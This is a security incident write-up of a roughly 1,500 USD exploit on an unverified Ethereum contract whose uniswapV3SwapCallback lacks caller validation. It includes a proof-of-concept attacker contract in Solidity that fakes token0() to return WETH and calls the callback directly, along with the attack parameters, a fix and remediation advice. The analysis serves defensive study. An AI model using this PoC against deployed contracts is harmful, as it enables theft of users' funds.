# Unverified 0xa89f — uniswapV3SwapCallback Unauthorized Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-04 |
| **Protocol** | Unverified Contract 0xa89f |
| **Chain** | Ethereum |
| **Loss** | ~1,500 USD |
| **Attacker** | [0xfe51ffcd](https://etherscan.io/address/0xfe51ffcd2af4748d77130646988f966733583dc1) |
| **Attack Tx** | [0x83c71a83](https://app.blocksec.com/explorer/tx/eth/0x83c71a83656b0fecfa860e76a9becf738930b3f1b2510c7d0339ab585090a82d) |
| **Vulnerable Contract** | [0xb3094734](https://etherscan.io/address/0xb3094734fe249a7b0110dc12d66f6c404ada28cb) |
| **Root Cause** | No caller validation in uniswapV3SwapCallback — authentication bypassed via a fake contract returning WETH from token0() |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/unverified_a89f_exp.sol) |

---
## 1. Vulnerability Overview

The 0xa89f (0xb3094734) contract had no caller validation in `uniswapV3SwapCallback`. The attacker used a fake contract whose `token0()` function returns WETH to deceive the vulnerable contract, then directly invoked the callback to drain its held WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable uniswapV3SwapCallback: flawed msg.sender and token0 validation
contract Vulnerable0xa89f {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        // ❌ Does not verify that msg.sender is a legitimate UniswapV3 pool
        // or only checks msg.sender.token0() without verifying factory registration
        address token = IPool(msg.sender).token0();  // ❌ Attacker can control the return value
        IERC20(token).transfer(/* to attacker */);
    }
}

// Attacker's fake contract:
contract AttackerC {
    function token0() external pure returns (address) {
        return weth;  // ← Manipulated to return WETH
    }
}

// ✅ Fix:
// address pool = IUniswapV3Factory(FACTORY).getPool(token0, token1, fee);
// require(msg.sender == pool, "caller is not pool");
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Unveriifieda89f_decompiled.sol
contract Unveriifieda89f {
    function swap(uint256 p0, uint256 p1, address p2, bytes memory p3) external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0xfe51ffcd)
  │
  ├─[1]─▶ Deploy AttackerC
  │         token0() → implemented to return WETH
  │
  ├─[2]─▶ Directly call uniswapV3SwapCallback:
  │         addr1.uniswapV3SwapCallback(
  │             360000000000000000,    // amount0Delta
  │             -86965571293199577,    // amount1Delta
  │             abi.encodePacked(uint8(0), uint256(0))
  │         )
  │         └─ ❌ msg.sender(=AttackerC).token0() == WETH → authentication passes
  │             WETH transferred to attacker
  │
  └─[3]─▶ ~1,500 USD WETH drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    function attack() public {
        // ❌ Directly invoke callback with fake pool contract
        bytes memory data = abi.encodePacked(uint8(0), uint256(0));
        (bool ok, ) = addr1.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(360000000000000000),   // amount0Delta
                int256(-86965571293199577),   // amount1Delta
                data
            )
        );
        // Vulnerable contract checks msg.sender.token0() == WETH → passes
    }

    // ❌ Vulnerable contract calls this function to determine token type
    function token0() external pure returns (address) {
        return weth;  // Returns the value the attacker desires
    }

    function fallback() external payable {}
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Callback authentication bypass |
| **Attack Vector** | token0() manipulation via fake pool contract |
| **CWE** | CWE-346: Origin Validation Error |
| **DASP** | Access Control vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Verify factory registration**: Use `IUniswapV3Factory.getPool()` to confirm msg.sender is a legitimate pool
2. **Store token0/token1 directly**: Save token addresses as immutable at deployment time and re-verify during callbacks
3. **Do not trust calls to msg.sender**: Never trust the return value of a function called on msg.sender within a callback
4. **Restrict callback entry**: Use a guard variable to only accept callbacks during an active internal swap

## 7. Lessons Learned

- The pattern of trusting `msg.sender.token0()` can be bypassed by an attacker deploying a fake contract that returns any desired value from `token0()`.
- Uniswap V3 callback authentication must include pool address verification through the Factory registry.
- The callback pattern in unverified contracts was exploited identically across three incidents in September alone: 0x03f9, 0x766a, and 0xa89f.